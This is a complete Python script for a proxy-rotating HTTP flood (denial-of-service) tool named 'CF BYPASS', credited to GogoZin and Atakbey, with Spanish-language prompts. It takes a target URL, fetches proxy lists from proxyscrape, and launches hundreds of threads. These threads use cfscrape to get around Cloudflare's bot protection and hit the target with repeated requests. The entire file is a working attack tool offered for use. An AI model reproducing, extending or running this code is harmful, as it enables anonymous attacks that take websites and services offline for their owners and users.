import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
print(Fore.YELLOW + """  
  ____ _____   ______   ______   _    ____ ____
 / ___|  ___| | __ ) \ / /  _ \ / \  / ___/ ___|
| |   | |_    |  _ \\  V /| |_) / _ \ \___ \___ \ \r
| |___|  _|   | |_) || | |  __/ ___ \ ___) |__) |
 \____|_|     |____/ |_| |_| /_/   \_\____/____/
""")
print("Coded By GogoZin Developed By Atakbey - 2020")
print("visit website ak74security.org")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print(Fore.RED + "Espere unos segundos para que los hilos estén listos para atacar...")
	time.sleep(10)
	input(Fore.CYAN + "Enter para iniciar el ataque SSL!")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + "Url : " + Fore.WHITE))
	ssl = str(input(Fore.GREEN + "El sitio utiliza SSL? (y/n) : " + Fore.WHITE))
	ge = str(input(Fore.GREEN + "Obtener nueva lista de proxys? (y/n) : " + Fore.WHITE))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By GogoZin
			with open('proxy.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Proxy HTTP recibido con éxito!")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By GogoZin
			with open('proxy.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Proxy HTTP recibido con éxito!")
	else:
		pass
	list = str(input(Fore.GREEN + "Liste (proxy.txt) : " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "Proxies Count : " + Fore.WHITE + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + "Threads (1-400 Default Is 300) : " + Fore.WHITE))
	per = int(input(Fore.GREEN + "CC.Power (1-100 Default Is 70) : " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(url)
				print(Fore.CYAN + "Bypass -> " + Fore.WHITE + str(url)+ Fore.CYAN + " From~# " +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + "Bypass -> " + Fore.WHITE + str(url)+Fore.CYAN + " From~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1])) #code By GogoZin
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "No se puede conectar a proxy o URL!")


if __name__ == "__main__":
	main()
